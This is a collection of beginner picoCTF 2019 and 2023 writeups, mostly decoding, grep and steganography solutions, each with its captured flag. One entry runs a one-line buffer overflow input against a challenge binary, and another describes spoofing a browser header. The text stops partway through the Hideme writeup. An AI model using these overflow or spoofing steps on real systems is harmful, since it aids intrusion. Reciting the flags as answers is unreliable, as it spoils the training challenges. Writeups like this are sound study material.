<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-chad-ballay
description: CTF writeups and security challenges by Chad-Ballay.
---

# Writeups by Chad-Ballay

Source repository: `/repos/Chad-Ballay`

## Repository Index

- CTF-writeups/README.md
- CTF-writeups/notes.md
- CTF-writeups/picoCTF2019/13.md
- CTF-writeups/picoCTF2019/2Warm.md
- CTF-writeups/picoCTF2019/README.md
- CTF-writeups/picoCTF2019/based.md
- CTF-writeups/picoCTF2019/bases.md
- CTF-writeups/picoCTF2019/ceaser.md
- CTF-writeups/picoCTF2019/dont-use-client-side.md
- CTF-writeups/picoCTF2019/easy1.md
- CTF-writeups/picoCTF2019/extensions.md
- CTF-writeups/picoCTF2019/factory_secret.md
- CTF-writeups/picoCTF2019/first_grep.md
- CTF-writeups/picoCTF2019/flags.md
- CTF-writeups/picoCTF2019/glory-of-the-garden.md
- CTF-writeups/picoCTF2019/grep_part_ii.md
- CTF-writeups/picoCTF2019/handy-shellcode.md
- CTF-writeups/picoCTF2019/inspector.md
- CTF-writeups/picoCTF2019/la-cifra-de.md
- CTF-writeups/picoCTF2019/like1000.md
- CTF-writeups/picoCTF2019/mr-worldwide.md
- CTF-writeups/picoCTF2019/numbers.md
- CTF-writeups/picoCTF2019/overflow-0.md
- CTF-writeups/picoCTF2019/picobrowser.md
- CTF-writeups/picoCTF2019/plumbing.md
- CTF-writeups/picoCTF2019/practice-run-1.md
- CTF-writeups/picoCTF2019/resources.md
- CTF-writeups/picoCTF2019/shark-on-the-wire-1.md
- CTF-writeups/picoCTF2019/so_meta.md
- CTF-writeups/picoCTF2019/strings_it.md
- CTF-writeups/picoCTF2019/tapping.md
- CTF-writeups/picoCTF2019/unzip.md
- CTF-writeups/picoCTF2019/vault-door-1.md
- CTF-writeups/picoCTF2019/vault-door-3.md
- CTF-writeups/picoCTF2019/vault-door-4.md
- CTF-writeups/picoCTF2019/vault-door-5.md
- CTF-writeups/picoCTF2019/vault-door-training.md
- CTF-writeups/picoCTF2019/warmed_up.md
- CTF-writeups/picoCTF2019/waves_over_lambda.md
- CTF-writeups/picoCTF2019/what_is_netcat.md
- CTF-writeups/picoCTF2019/what_lies_within.md
- CTF-writeups/picoCTF2019/where_are_the_robots.md
- CTF-writeups/picoCTF2019/where_is_the_file.md
- CTF-writeups/picoCTF2023/README.md
- CTF-writeups/picoCTF2023/hideme.md
- CTF-writeups/picoCTF2023/more_sqli.md

## Writeup Content


### File: CTF-writeups/README.md

# CTF-writeups
Collection of CTF's

1. [PicoCTF 2019](./picoCTF2019/) - Initial foray.  It's a geared to high school level so I figure it'll be fun.
2. [PicoCTF 2023](./picoCTF2023/) - Coming back to picoCTF.  



### File: CTF-writeups/picoCTF2019/README.md

# PicoCTF 2019

This one is geared to middle/high schoolers.  Mainly it's to get an understanding of how CTF's work and to have fun. Using it to work out the kinks of writeups and documenting.

In the end work/life stopped me from continued effort.  
![progress.png](progress.png)

Site: [https://2019game.picoctf.com/](https://2019game.picoctf.com/)

1. [The Factory's Secret](factory_secret.md)
1. [Insp3ct0r](inspector.md)
1. [The numbers... what do they mean?](numbers.md)
1. [Warmed Up](warmed_up.md)
1. [Unzip](unzip.md)
1. [Like1000](like1000.md)
1. [dont-use-client-side](dont-use-client-side.md)
1. [2Warm](2Warm.md)
1. [vault-door-training](vault-door-training.md)
1. [13](13.md)
1. [First Grep](first_grep.md)
1. [Resources](resources.md)
1. [Practice Run 1](practice-run-1.md)
1. [Glory of the Garden](glory-of-the-garden.md)
1. [vault-door-1](vault-door-1.md)
1. [vault-door-3](vault-door-3.md)
1. [vault-door-4](vault-door-4.md)
1. [Bases](bases.md)
1. [Strings it](strings_it.md)
1. [What's a net cat?](what_is_netcat.md)
1. [Based](based.md)
1. [Easy1](easy1.md)
1. [Ceaser](ceaser.md)
1. [Where are the robots?](where_are_the_robots.md)
1. [So meta](so_meta.md)
1. [Flags](flags.md)
1. [Plumbing](plumbing.md)
1. [First Grep: Part II](grep_part_ii.md)
1. [Where is the file?](where_is_the_file.md)
1. [What lies within](what_lies_within.md)
1. [Extensions](extensions.md)
1. [Shark on the wire 1](shark-on-the-wire-1.md)
1. [Picobrowser](picobrowser.md)
1. [Tapping](tapping.md)
1. [Waves Over Lambda](waves_over_lambda.md)
1. [Handy-shellcode](handy-shellcode.md)
1. [OverFlow 0](overflow-0.md)
1. [Mr Worldwide](mr-worldwide.md)
1. [La Cifra De](la-cifra-de.md)
1. [Vault-door-5](vault-door-5.md)



### File: CTF-writeups/picoCTF2023/README.md

# PicoCTF 2023

This is my second dive back into PicoCTF.  They are fun but I just don't have the time/focus to do them.  Will be trying to work through these again.  

The format of the CTF has changed a bit.  Previously each year's CTF was maintained as seperate subdomain on their website.  Starting in 2020 they have started folding the previous games into the training area of the main site.

1.  Create an account here. [https://play.picoctf.org/register](https://play.picoctf.org/register)  
2.  Once you have done that then login using those credentials here.  [https://play.picoctf.org/login](https://play.picoctf.org/login)  
3.  Next go to the Practice area of the website.  [https://play.picoctf.org/practice](https://play.picoctf.org/practice)  
4.  From the filter categories on the left choose picoCTF2023.  You'll end up with this url.  [https://play.picoctf.org/practice?originalEvent=72&page=1](https://play.picoctf.org/practice?originalEvent=72&page=1)  

### Solutions

1. [More SQLi](more_sqli.md)
1. [Hideme](hideme.md)



### File: CTF-writeups/notes.md

https://github.com/Chad-Ballay/CTF-writeups

Visual Studio Code
https://code.visualstudio.com/

Github
https://www.github.com

Markdown Tutorial
https://www.markdowntutorial.com/

Cybersecurity Roadmap
https://roadmap.sh/cyber-security



### File: CTF-writeups/picoCTF2019/13.md

# 13 

## Problem
Cryptography can be easy, do you know what ROT13 is? cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}

## Solution
Take that and put into any of the rot13 convertors.
rot13 just rotates it 13 chars.
[https://rot13.com](https://rot13.com)
picoCTF{not_too_bad_of_a_problem}





### File: CTF-writeups/picoCTF2019/2Warm.md

# 2Warm 

## Problem
Can you convert the number 42 (base 10) to binary (base 2)?

## Solution
1	0
2	1
4	0
8	1
16	0
32	1

picoCTF{101010}



### File: CTF-writeups/picoCTF2019/based.md

# Based 

## Problem
To get truly 1337, you must understand different data encodings, such as hexadecimal or binary. Can you get the flag from this program to prove you are on the way to becoming 1337? Connect with nc 2019shell1.picoctf.com 28758.

## Solution
Used a couple of online convertors because I was too lazy to script the connection.


picoCTF{learning_about_converting_values_4b4e293e}



### File: CTF-writeups/picoCTF2019/bases.md

# Bases 

## Problem
What does this bDNhcm5fdGgzX3IwcDM1 mean? I think it has something to do with bases.

## Solution
Tried a few different conversions until I got to base64.

[https://codebeautify.org/base64-decode](https://codebeautify.org/base64-decode)

picoCTF{l3arn_th3_r0p35}

Next time just use base64
```
echo "bDNhcm5fdGgzX3IwcDM1" | base64 -d
```



### File: CTF-writeups/picoCTF2019/ceaser.md

# Ceaser 

## Problem
Decrypt this [message](https://2019shell1.picoctf.com/static/61868db3838204e921e70dc9a883f0fe/ciphertext). You can find the ciphertext in /problems/caesar_1_4c9d445f770c71bd84ab0d822197a005 on the shell server.

## Solution
https://cryptii.com/pipes/caesar-cipher
picoCTF{crossingtherubiconwmanvbbo}




### File: CTF-writeups/picoCTF2019/dont-use-client-side.md

# dont-use-client-side 

## Problem
Can you break into this super secure portal? https://2019shell1.picoctf.com/problem/47289/ [link](http://2019shell1.picoctf.com:47289) or http://2019shell1.picoctf.com:47289

## Solution
Loading source of the page yielded this headache.         
```
<script type="text/javascript">
  function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == 'e22d') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_c') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == 'c}') {
                  alert("Password Verified")
                  }
                }
              }
      
            }
          }
        }
      }
    }
    else {
      alert("Incorrect password");
    }
    
  }
</script>
```
Parsing that quickly, yields this.
picoCTF{no_clients_plz_ce22dc}



### File: CTF-writeups/picoCTF2019/easy1.md

# Easy1 

## Problem
The one time pad can be cryptographically secure, but not when you know the key. Can you solve this? We've given you the encrypted flag, key, and a table to help UFJKXQZQUNB with the key of SOLVECRYPTO. Can you use this [table](https://2019shell1.picoctf.com/static/30d4405c34cf6490b082e6cf8f56ac56/table.txt) to solve it?.

## Solution
UFJKXQZQUNB

It's a Vigenère cipher

picoCTF{CRYPTOISFUN}




### File: CTF-writeups/picoCTF2019/extensions.md

# Extensions 

## Problem
This is a really weird text file [TXT](https://2019shell1.picoctf.com/static/45886ed4b6d5d1dc74c4944fcf4b4041/flag.txt)? Can you find the flag?

## Solution
chad@brakebills:~/Downloads$ file flag.txt 
flag.txt: PNG image data, 1697 x 608, 8-bit/color RGB, non-interlaced
chad@brakebills:~/Downloads$ mv flag.txt flag.png

Opened the image
picoCTF{now_you_know_about_extensions}




### File: CTF-writeups/picoCTF2019/factory_secret.md

There appear to be some mysterious glyphs hidden inside this abandoned factory... I wonder what would happen if you collected them all?




### File: CTF-writeups/picoCTF2019/first_grep.md

# First Grep 

## Problem
Can you find the flag in [file](https://2019shell1.picoctf.com/static/458ae91cb23746189bf490f0c8d9a919/file)? This would be really tedious to look through manually, something tells me there is a better way. You can also find the file in /problems/first-grep_2_04dbf496b78e6c37c0097cdfef734d88 on the shell server.

## Solution
```
chad@brakebills:~/Downloads$ grep pico file 
picoCTF{grep_is_good_to_find_things_bf6aec61}
```





### File: CTF-writeups/picoCTF2019/flags.md

# Flags 

## Problem
What do the [flags](https://2019shell1.picoctf.com/static/ae23b7df04365ab0213f0158c5b5d694/flag.png) mean?

## Solution
The image is a of navy flag code.  Growing up near the water made this an easy google to find a way to translate.

https://www.dcode.fr/maritime-signals-code

PICOCTF{F1AG5AND5TUFF}





### File: CTF-writeups/picoCTF2019/glory-of-the-garden.md

# Glory of the Garden 

## Problem
This [garden](https://2019shell1.picoctf.com/static/86137520022d967547d5a2c99f4231f2/garden.jpg) contains more than it seems. You can also find the file in /problems/glory-of-the-garden_2_258af8e13bd7259207af0b0ee6fab645 on the shell server.

## Solution
Ran strings and grepped for pico
picoCTF{more_than_m33ts_the_3y31e0af5C7}



### File: CTF-writeups/picoCTF2019/grep_part_ii.md

# First Grep: Part II 

## Problem
Can you find the flag in /problems/first-grep--part-ii_1_4496a9af2273007b52d4a1adec323b76/files on the shell server? Remember to use grep.


## Solution
find . -type f -exec grep picoCTF {} \;

picoCTF{grep_r_to_find_this_af11356f}




### File: CTF-writeups/picoCTF2019/handy-shellcode.md

# Handy-shellcode 

## Problem
This [program](https://2019shell1.picoctf.com/static/9e6254fb3c561cef02f30e7e90ef2ea7/vuln) executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9 on the shell server. [Source](https://2019shell1.picoctf.com/static/9e6254fb3c561cef02f30e7e90ef2ea7/vuln.c).


## Solution
I ain't gonna lie.  This one reminded me of a problem last year so I referenced how to solved that one.  It involves exploiting the BUFSIZE array overrun.  Here is a bit of code.  https://raw.githubusercontent.com/ishara1995/picoCTF2019/master/handy-shellcode/exploit.py

picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}




### File: CTF-writeups/picoCTF2019/inspector.md

# Insp3ct0r

## Problem
Kishor Balan tipped us off that the following code may need inspection: [https://2019shell1.picoctf.com/problem/63975/](http://2019shell1.picoctf.com:63975)


## Solution
Look at the source for the html, css, and javascript.  Flag is in the code.


picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?994f00cd}


### File: CTF-writeups/picoCTF2019/la-cifra-de.md

# La Cifra De 

## Problem
I found this cipher in an old book. Can you figure out what it says? Connect with `nc 2019shell1.picoctf.com 60147`.

## Solution
```
Ne iy nytkwpsznyg nth it mtsztcy vjzprj zfzjy rkhpibj nrkitt ltc tnnygy ysee itd tte cxjltk

Ifrosr tnj noawde uk siyyzre, yse Bnretèwp Cousex mls hjpn xjtnbjytki xatd eisjd

Iz bls lfwskqj azycihzeej yz Brftsk ip Volpnèxj ls oy hay tcimnyarqj dkxnrogpd os 1553 my Mnzvgs Mazytszf Merqlsu ny hox moup Wa inqrg ipl. Ynr. Gotgat Gltzndtg Gplrfdo 

Ltc tnj tmvqpmkseaznzn uk ehox nivmpr g ylbrj ts ltcmki my yqtdosr tnj wocjc hgqq ol fy oxitngwj arusahje fuw ln guaaxjytrd catizm tzxbkw zf vqlckx hizm ceyupcz yz tnj fpvjc hgqqpohzCZK{m311a50_0x_a1rn3x3_h1ah3xfmel1g3m}

Tnj qixxe wkqw-duhfmkseej ipsiwtpznzn uk l puqjarusahjeii htpnjc hubpvkw, hay rldk fcoaso 1467 be Qpot Gltzndtg Fwbkwei.

Zmp Volpnèxj Nivmpr ox ehkwpfuwp surptorps ifwlki ehk Fwbkwei Jndc uw Llhjcto Htpnjc.

It 1508, Ozhgsyey Ycizmpmozd itapnzjo tnj do-ifwlki eahzwa xjntg (f xazwtx uk dhokeej fwpnfmezx) ehgy hoaqo lgypr hj l cxneiifw curaotjyt uk ehk Atgksèce Inahkw.

Merqlsu’x deityd htzkrje avupaxjo it 1555 fd a itytosfaznzn uk ehk ktryy. Ehk qzwkw saraps uk ehk fwpnfmezx lrk szw ymtfzjo rklflgwwy, hze tnj llvmlbkyd ati ehk nydkc wezypry fce sniej gj mkfys uk l mtjxotnn kkd ahxfde, cmtcn hln hj oilkprkse woys eghs cuwceyuznjjyt.
```
Used this [site](https://www.guballa.de/vigenere-solver)

Got this text
```
halfpicoCTF{b311a50_0r_v1gn3r3_c1ph3rabef1b3b}
```





### File: CTF-writeups/picoCTF2019/like1000.md

# Like1000 

## Problem
This [.tar](https://2019shell1.picoctf.com/static/8694f84879d3b7c0dcf775930f4665fc/1000.tar) file got tarred alot. Also available at /problems/like1000_0_369bbdba2af17750ddf10cc415672f1c.

## Solution
Tar file starts at 1000.tar and appears to contain a file called filler.txt and another tar file 999.tar.  Looks like it is a bunch of nested tar files.
```
#!/bin/bash

while [ `ls -1 *.tar | wc -l` ]; do 
	FILENAME=`ls *tar`
	tar -xvf $FILENAME
	rm $FILENAME
done
```
Ran for a couple of seconds an yielded a flag.png file.  picoCTF{l0t5_0f_TAR5}



### File: CTF-writeups/picoCTF2019/mr-worldwide.md

# Mr Worldwide 

## Problem
A musician left us a [message](https://2019shell1.picoctf.com/static/46e165b0a953075440f3a544fdb4cff1/message.txt). What's it mean?

## Solution
It's a bunch of GPS locations.
```
picoCTF{(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)}
```

Resolve them and take the first letter
picoCTF{KODIAK_ALASKA}




### File: CTF-writeups/picoCTF2019/numbers.md

# The numbers... what do they mean?

## Problem
The [numbers](https://2019shell1.picoctf.com/static/880cb722e666005093d6c2c5751ec042/the_numbers.png)... what do they mean?

## Solution
Pulls up an image that is a simple substitution cipher.  
```
16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 }
```
```
PICOCTF{THENUMBERSMASON}
```

This one stumped me for a bit due to bouncing around the case.  I overthought it.


### File: CTF-writeups/picoCTF2019/overflow-0.md

# OverFlow 0 

## Problem
This should be easy. Overflow the correct buffer in this [program](https://2019shell1.picoctf.com/static/8df893afa5d4ecda515901499b0fdd52/vuln) and get a flag. Its also found in /problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7 on the shell server. [Source](https://2019shell1.picoctf.com/static/8df893afa5d4ecda515901499b0fdd52/vuln.c).

## Solution
The name is the give away.  Buffer overflow.
```
wiglaf1979@pico-2019-shell1:/problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7$ ./vuln `python -c "print 'a'*(133)"`
picoCTF{3asY_P3a5yb197d4e2}
```




### File: CTF-writeups/picoCTF2019/picobrowser.md

# Picobrowser 

## Problem
This website can be rendered only by picobrowser, go and catch the flag! https://2019shell1.picoctf.com/problem/12255/ ([link](https://2019shell1.picoctf.com/problem/12255/)) or http://2019shell1.picoctf.com:12255


## Solution
Used google chrome developer tools to get the curl call for when you clicked the button.  Then modified the header to specify the browser to being picobrowser.

picoCTF{p1c0_s3cr3t_ag3nt_bbe8a517}




### File: CTF-writeups/picoCTF2019/plumbing.md

# Plumbing 

## Problem
Sometimes you need to handle process data outside of a file. Can you find a way to keep the output from this program and search for the flag? Connect to 2019shell1.picoctf.com 63345.

## Solution
```
chad@brakebills:~/Downloads$ nc 2019shell1.picoctf.com 63345 | grep pico
picoCTF{digital_plumb3r_4e7a5813}
```



### File: CTF-writeups/picoCTF2019/practice-run-1.md

# Practice Run 1 

## Problem
You're going to need to know how to run programs if you're going to get out of here. Navigate to /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e on the shell server and run this [program](https://2019shell1.picoctf.com/static/6eba3b66e7a2b786c6c9769711d85663/run_this) to receive a flag.

## Solution
Ran strings on the file and got lucky.
picoCTF{g3t_r3adY_2_r3v3r53}




### File: CTF-writeups/picoCTF2019/resources.md

# Resources 

## Problem
We put together a bunch of resources to help you out on our website! If you go over there, you might even find a flag! https://picoctf.com/resources [link](https://picoctf.com/resources)

## Solution
It's on the page.
picoCTF{r3source_pag3_f1ag}




### File: CTF-writeups/picoCTF2019/shark-on-the-wire-1.md

# Shark on the wire 1 

## Problem
We found this [packet capture](https://2019shell1.picoctf.com/static/ae9ca8cff43ed638ed5d137f9ece7455/capture.pcap). Recover the flag. You can also find the file in /problems/shark-on-wire-1_0_13d709ec13952807e477ba1b5404e620.

## Solution
Opened up the pcap in Wireshark.  Started trying to slice the data.  Searched for picoCTF with no luck.  Noticed that there was a slew of single byte data UDP packets to 10.0.0.12.  Reading them together comes out to this.

picoCTF{StaT31355_636f6e6e}

Had to manually transcribe this so need to figure out how to read it as a stream.




### File: CTF-writeups/picoCTF2019/so_meta.md

# So meta 

## Problem
Find the flag in this [picture](https://2019shell1.picoctf.com/static/6244be6c6263db822861cdd1018f4126/pico_img.png). You can also find the file in /problems/so-meta_1_ab9d99603935344b81d7f07973e70155.

## Solution
Strings yet again for the win.
```
chad@brakebills:~/Downloads$ strings pico_img.png | grep pico
picoCTF{s0_m3ta_368a0341}
chad@brakebills:~/Downloads$ 
```





### File: CTF-writeups/picoCTF2019/strings_it.md

# Strings it 

## Problem
Can you find the flag in [file](https://2019shell1.picoctf.com/static/e93edd77d319a5a634cd4d20159cbc1d/strings) without running it? You can also find the file in /problems/strings-it_3_8386a6aa560aecfba03c0c6a550b5c51 on the shell server.

## Solution
```
chad@brakebills:~/Downloads$ strings strings | grep pico
picoCTF{5tRIng5_1T_c7fff9e5}
chad@brakebills:~/Downloads$ 
```




### File: CTF-writeups/picoCTF2019/tapping.md

# Tapping 

## Problem
Theres tapping coming in from the wires. What's it saying nc 2019shell1.picoctf.com 32273.

## Solution
Spits out morse code.
```
chad@brakebills:~/Downloads$ nc 2019shell1.picoctf.com 32273
.--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. .---- -.... --... --... ..--- ..... --... ..--- ---.. --... } 
```
http://www.unit-conversion.info/texttools/morse-code/
PICOCTF{M0RS3C0D31SFUN1677257287}



### File: CTF-writeups/picoCTF2019/unzip.md

# Unzip

## Problem
Can you unzip this [file](https://2019shell1.picoctf.com/static/97e37c0fc127ea82eabeb6a32bf18ce0/flag.zip) and get the flag?

## Solution

unzipped and it inflated to flag.png
Image was the flag.

picoCTF{unz1pp1ng_1s_3a5y}


### File: CTF-writeups/picoCTF2019/vault-door-1.md

# vault-door-1 

## Problem
This vault uses some complicated arrays! I hope you can make sense of it, special agent. The source code for this vault is here: [VaultDoor1.java](https://2019shell1.picoctf.com/static/2e4a9c36c1d51d5de4c82f7507c69bf7/VaultDoor1.java)

## Solution
Source code with a bunch of array slicing and dicing.  
```
chad@brakebills:~/Downloads$ grep password.charAt VaultDoor1.java | cut -f2- -d"("| sort -n | cut -f2 -d\'| paste -s -d ""
d35cr4mbl3_tH3_cH4r4cT3r5_2487f0
```
picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_2487f0}



### File: CTF-writeups/picoCTF2019/vault-door-3.md

# vault-door-3 

## Problem
This vault uses for-loops and byte arrays. The source code for this vault is here: [VaultDoor3.java](https://2019shell1.picoctf.com/static/5836e614d568094316ead6771b3347c0/VaultDoor3.java)

## Solution
Code has this function.
```
    public boolean checkPassword(String password) {
        if (password.length() != 32) {
            return false;
        }
        char[] buffer = new char[32];
        int i;
        for (i=0; i<8; i++) {
            buffer[i] = password.charAt(i);
        }
        for (; i<16; i++) {
            buffer[i] = password.charAt(23-i);
        }
        for (; i<32; i+=2) {
            buffer[i] = password.charAt(46-i);
        }
        for (i=31; i>=17; i-=2) {
            buffer[i] = password.charAt(i);
        }
        String s = new String(buffer);
        return s.equals("jU5t_a_sna_3lpm1dg347_u_4_mfr54b");
    }
```
Manually walking this is not fun.

So just add a print statement to dump out buffer.

Then I fed it a string to make it a simple ceaser substitution.
```
picoCTF{abcdefghijklmnopqrstuvwxyz1234567}

abcdefghponmlkji5r3t1vyxwzu2s4q6
```

Then I just had to use the array in the code to swap things around.
```
jU5t_a_sna_3lpm1dg347_u_4_mfr54b

jU5t_a_s1mpl3_an4gr4m_4_u_7f35db
```

picoCTF{jU5t_a_s1mpl3_an4gr4m_4_u_7f35db}




### File: CTF-writeups/picoCTF2019/vault-door-4.md

# vault-door-4 

## Problem
This vault uses ASCII encoding for the password. The source code for this vault is here: [VaultDoor4.java](https://2019shell1.picoctf.com/static/970f9e687ee89053e5d5ce24a925448c/VaultDoor4.java)

## Solution
Downloaded the code and saw that it was just doing a comparison on an array of bytes with various encodings.  (binary, hex, ascii, etc...)

Decided to just spit out the array it was comparing against after converting it to a string.
```
    public boolean checkPassword(String password) {
        byte[] passBytes = password.getBytes();
        byte[] myBytes = {
            106 , 85  , 53  , 116 , 95  , 52  , 95  , 98  ,
            0x55, 0x6e, 0x43, 0x68, 0x5f, 0x30, 0x66, 0x5f,
            0142, 0131, 0164, 063 , 0163, 0137, 062 , 066 ,
            '7' , 'e' , '0' , '3' , 'd' , '1' , '1' , '6' ,
        };
        String string = new String(myBytes);  <===========
        System.out.println(string);           <===========
        for (int i=0; i<32; i++) {
            if (passBytes[i] != myBytes[i]) {
                return false;
            }
        }
        return true;
    }
}

```

```
chad@brakebills:~/Downloads$ javac VaultDoor4.java ; java VaultDoor4 
Enter vault password: picoCTF{abcdefghijklmnopqrstuvwxyz1234567}
jU5t_4_bUnCh_0f_bYt3s_267e03d116
Access denied!
```

picoCTF{jU5t_4_bUnCh_0f_bYt3s_267e03d116}




### File: CTF-writeups/picoCTF2019/vault-door-5.md

# Vault-door-5 

## Problem
In the last challenge, you mastered octal (base 8), decimal (base 10), and hexadecimal (base 16) numbers, but this vault door uses a different change of base as well as URL encoding! The source code for this vault is here: [VaultDoor5.java](https://2019shell1.picoctf.com/static/5d1069b6db73b5145e149575549ea2b5/VaultDoor5.java)

## Solution
Viewed the source code and saw that they check your input after URL encoding it, and then base64 encoding it.   The comparison is to this output.
```
    public boolean checkPassword(String password) {
        String urlEncoded = urlEncode(password.getBytes());
        String base64Encoded = base64Encode(urlEncoded.getBytes());
        String expected = "JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVm"
                        + "JTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2"
                        + "JTM0JTVmJTM1JTYyJTMxJTYxJTMwJTM5JTY0JTMy";
        return base64Encoded.equals(expected);
    }
```

So I just used these two sites to walk that backwards.
https://www.base64decode.org/
https://www.urldecoder.org/

Yielded this
c0nv3rt1ng_fr0m_ba5e_64_5b1a09d2
picoCTF{c0nv3rt1ng_fr0m_ba5e_64_5b1a09d2}

Decided to figure out the commandline version
```
j3balla:/Users/j3balla $ TEMP=`echo "JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVmJTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2JTM0JTVmJTM1JTYyJTMxJTYxJTMwJTM5JTY0JTMy" | base64 --decode`
j3balla:/Users/j3balla $ printf -v TEMP "%b" "${TEMP//\%/\x}"
j3balla:/Users/j3balla $ echo $TEMP
c0nv3rt1ng_fr0m_ba5e_64_5b1a09d2
j3balla:/Users/j3balla $
```



### File: CTF-writeups/picoCTF2019/vault-door-training.md

# vault-door-training 

## Problem
Your mission is to enter Dr. Evil's laboratory and retrieve the blueprints for his Doomsday Project. The laboratory is protected by a series of locked vault doors. Each door is controlled by a computer and requires a password to open. Unfortunately, our undercover agents have not been able to obtain the secret passwords for the vault doors, but one of our junior agents obtained the source code for each vault's computer! You will need to read the source code for each level to figure out what the password is for that vault door. As a warmup, we have created a replica vault in our training facility. The source code for the training vault is here: [VaultDoorTraining.java](https://2019shell1.picoctf.com/static/4ca411ae55cbf37cfae55ee83477a0dc/VaultDoorTraining.java)



## Solution
Source has this code.  Calls checkPassword() and in there is the string.
```
import java.util.*;

class VaultDoorTraining {
    public static void main(String args[]) {
        VaultDoorTraining vaultDoor = new VaultDoorTraining();
        Scanner scanner = new Scanner(System.in); 
        System.out.print("Enter vault password: ");
        String userInput = scanner.next();
	String input = userInput.substring("picoCTF{".length(),userInput.length()-1);
	if (vaultDoor.checkPassword(input)) {
	    System.out.println("Access granted.");
	} else {
	    System.out.println("Access denied!");
	}
   }

    // The password is below. Is it safe to put the password in the source code?
    // What if somebody stole our source code? Then they would know what our
    // password is. Hmm... I will think of some ways to improve the security
    // on the other doors.
    //
    // -Minion #9567
    public boolean checkPassword(String password) {
        return password.equals("w4rm1ng_Up_w1tH_jAv4_87f51143e4b");
    }
}
```
picoCTF{w4rm1ng_Up_w1tH_jAv4_87f51143e4b}




### File: CTF-writeups/picoCTF2019/warmed_up.md

# Warmed Up

## Problem
What is 0x3D (base 16) in decimal (base 10).

## Solution
Hex to dec conversion using google.

picoCTF{61}


### File: CTF-writeups/picoCTF2019/waves_over_lambda.md

# Waves Over Lambda 

## Problem
We made alot of substitutions to encrypt this. Can you decrypt it? Connect with nc 2019shell1.picoctf.com 12288.

## Solution
It was a substittuion cipher and rather than brute force it by looking for words I could solve I googled a solution finder.

https://www.guballa.de/substitution-solver

picoCTF{frequency_is_c_over_lambda_drtmtnddlw}




### File: CTF-writeups/picoCTF2019/what_is_netcat.md

# What's a net cat? 

## Problem
Using netcat (nc) is going to be pretty important. Can you connect to 2019shell1.picoctf.com at port 4158 to get the flag?

## Solution
```
chad@brakebills:~/Downloads$ nc 2019shell1.picoctf.com 4158
You're on your way to becoming the net cat master
picoCTF{nEtCat_Mast3ry_700da9c7}
```




### File: CTF-writeups/picoCTF2019/what_lies_within.md

# What lies within 

## Problem
Theres something in the [building](https://2019shell1.picoctf.com/static/aec3861fc4d5bce4d39dc0db196426de/buildings.png). Can you retrieve the flag?

## Solution
Strings didn't report anything.  Nor did a cursory hexdump.  Bumpkis for exiftool.

Decided to check out some of the stegnography tools
http://stylesuxx.github.io/steganography/

Dumped it right out.  Don't understand how to do this by hand and need to research that.  Will need to add to TODO list.

picoCTF{h1d1ng_1n_th3_b1t5}






### File: CTF-writeups/picoCTF2019/where_are_the_robots.md

# Where are the robots? 

## Problem
Can you find the robots? https://2019shell1.picoctf.com/problem/21868/ ([link](https://2019shell1.picoctf.com/problem/21868/)) or http://2019shell1.picoctf.com:21868

## Solution
This one I feel a bit bad about.  It's a copy of a previous year's problem and I just got done working it in preperation to this one beginning.

https://2019shell1.picoctf.com/problem/21868/
https://2019shell1.picoctf.com/problem/21868/robots.txt

This then leads to this text
```
User-agent: *
Disallow: /e0779.html
```

https://2019shell1.picoctf.com/problem/21868/e0779.html

And on that page we find the key.
picoCTF{ca1cu1at1ng_Mach1n3s_e0779}






### File: CTF-writeups/picoCTF2019/where_is_the_file.md

# Where is the file? 

## Problem
I've used a super secret mind trick to hide this file. Maybe something lies in /problems/where-is-the-file_6_8eae99761e71a8a21d3b82ac6cf2a7d0.

## Solution
File started with a dot(.) so ls -la on the directory.

picoCTF{w3ll_that_d1dnt_w0RK_a88d16e4}




### File: CTF-writeups/picoCTF2023/hideme.md

# Hideme 

## Problem
Every file gets a flag.
The SOC analyst saw one image been sent back and forth between two people. They decided to investigate and found out that there was more than what meets the eye [here](https://artifacts.picoctf.net/c/257/flag.png).

## Solution
You are given a file titled flag.png that when you load it, it does render an image correctly.  When I ran strings on the file there were some ASCII strings found that had the word secret in it.  Looked at the metadata in the EXIF viewer and didn't see anything informative.  Next up, I googled some stegnography tools and writeups to try and get a better idea of what to do next.   
[https://infosecwriteups.com/beginners-ctf-guide-finding-hidden-data-in-images-e3be9e34ae0d](https://infosecwriteups.com/beginners-ctf-guide-finding-hidden-data-in-images-e3be9e34ae0d)  

Working through the example tools, we came across binwalk.  This tool will scan the file and try to identify embedded files within the main file.  
```
wiglaf1979@wiglaf1979-ThinkPad-T480:~/Downloads$ binwalk -e flag.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 512 x 504, 8-bit/color RGBA, non-interlaced
41            0x29            Zlib compressed data, compressed
39739         0x9B3B          Zip archive data, at least v1.0 to extract, name: secret/
